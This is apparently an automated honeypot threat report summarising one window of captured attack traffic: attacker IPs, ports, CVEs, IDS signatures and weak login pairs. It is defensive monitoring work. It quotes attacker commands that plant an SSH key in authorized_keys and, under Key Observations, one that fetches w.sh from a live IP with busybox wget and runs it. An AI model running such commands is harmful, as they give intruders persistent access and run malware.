**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-19T10:01:25Z
*   **Timeframe of a report:** 2025-10-19T09:20:02Z to 2025-10-19T10:00:01Z
*   **Files Used to Generate Report:**
    *   `agg_log_20251019T092002Z.json`
    *   `agg_log_20251019T094001Z.json`
    *   `agg_log_20251019T100001Z.json`

**Executive Summary**

This report summarizes 25,503 events collected from the honeypot network. The majority of attacks were captured by the Cowrie honeypot. The most prominent attacker IP was `185.243.96.105`, and the most targeted port was `vnc/5900`. A number of CVEs were detected, with `CVE-2005-4050` being the most frequent. Attackers attempted various commands, including reconnaissance and attempts to modify SSH configurations.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Cowrie: 9964
    *   Heralding: 5040
    *   Honeytrap: 3517
    *   Suricata: 3192
    *   Sentrypeer: 2392
    *   Ciscoasa: 1023
    *   Adbhoney: 81
    *   Dionaea: 88
    *   Tanner: 43
    *   H0neytr4p: 61
    *   ConPot: 18
    *   Mailoney: 26
    *   ssh-rsa: 30
    *   Honeyaml: 14
    *   Redishoneypot: 3
    *   Dicompot: 5
    *   ElasticPot: 2
    *   Ipphoney: 3
    *   Wordpot: 1

*   **Top Attacking IPs:**
    *   185.243.96.105: 5040
    *   194.50.16.73: 2063
    *   72.146.232.13: 1215
    *   198.23.190.58: 1205
    *   23.94.26.58: 1175
    *   198.12.68.114: 854
    *   89.221.212.117: 758
    *   45.128.199.34: 498
    *   129.212.187.135: 494
    *   200.118.99.170: 271
    *   107.170.36.5: 249
    *   103.189.234.85: 203
    *   159.223.6.241: 275
    *   91.230.235.161: 198
    *   178.62.252.242: 243
    *   58.69.56.44: 214
    *   45.121.147.47: 224

*   **Top Targeted Ports/Protocols:**
    *   vnc/5900: 5040
    *   5060: 2392
    *   22: 2206
    *   UDP/5060: 1392
    *   5903: 227
    *   8333: 211
    *   TCP/22: 160
    *   443: 66
    *   5901: 111
    *   TCP/80: 62
    *   80: 41
    *   TCP/1433: 46
    *   1433: 38

*   **Most Common CVEs:**
    *   CVE-2005-4050
    *   CVE-2021-3449
    *   CVE-2019-11500
    *   CVE-2002-0013
    *   CVE-2002-0012
    *   CVE-2024-12856
    *   CVE-2024-12885
    *   CVE-2019-16920
    *   CVE-2023-52163
    *   CVE-2023-31983
    *   CVE-2024-10914
    *   CVE-2009-2765
    *   CVE-2015-2051
    *   CVE-2019-10891
    *   CVE-2024-33112
    *   CVE-2025-11488
    *   CVE-2022-37056
    *   CVE-2006-3602
    *   CVE-2006-4458
    *   CVE-2006-4542
    *   CVE-2021-42013
    *   CVE-2016-20016
    *   CVE-2014-6271
    *   CVE-2001-0414

*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
    *   `uname -a`
    *   `whoami`
    *   `lscpu | grep Model`
    *   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
    *   `w`
    *   `top`
    *   `Enter new UNIX password:`

*   **Signatures Triggered:**
    *   ET VOIP MultiTech SIP UDP Overflow (2003237)
    *   ET DROP Dshield Block Listed Source group 1 (2402000)
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port (2023753)
    *   ET SCAN NMAP -sS window 1024 (2009582)
    *   ET SCAN Potential SSH Scan (2001219)
    *   ET SCAN Suspicious inbound to MSSQL port 1433 (2010935)
    *   ET INFO Reserved Internal IP Traffic (2002752)
    *   ET HUNTING RDP Authentication Bypass Attempt (2034857)
    *   ET CINS Active Threat Intelligence Poor Reputation IP

*   **Users / Login Attempts:**
    *   root/: 30
    *   /Passw0rd: 21
    *   345gs5662d34/345gs5662d34: 18
    *   user01/Password01: 12
    *   /1q2w3e4r: 12
    *   /passw0rd: 10
    *   /1qaz2wsx: 9
    *   support/5555: 6
    *   nobody/qwer1234: 6
    *   user/00000: 6
    *   nobody/nobody2025: 6

*   **Files Uploaded/Downloaded:**
    *   wget.sh;
    *   w.sh;
    *   c.sh;
    *   rondo.*.sh
    *   apply.cgi
    *   system.html
    *   34.165.197.224
    *   SOAP-ENV:Envelope>

*   **HTTP User-Agents:**
    *   No HTTP User-Agent data was observed during this period.

*   **SSH Clients and Servers:**
    *   **SSH Clients:** No specific SSH client software was identified.
    *   **SSH Servers:** No specific SSH server software was identified.

*   **Top Attacker AS Organizations:**
    *   No attacker AS organization data was available.

**Key Observations and Anomalies**

*   The vast majority of attacks are automated and programmatic, focusing on VNC and SIP protocols.
*   A significant number of commands are geared towards establishing persistent access by adding an SSH key to `authorized_keys`.
*   The command `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh;` indicates attempts to download and execute malicious scripts.
*   The lack of diverse User-Agent strings suggests that most of the HTTP-based attacks are from automated tools or scripts, not from web browsers.
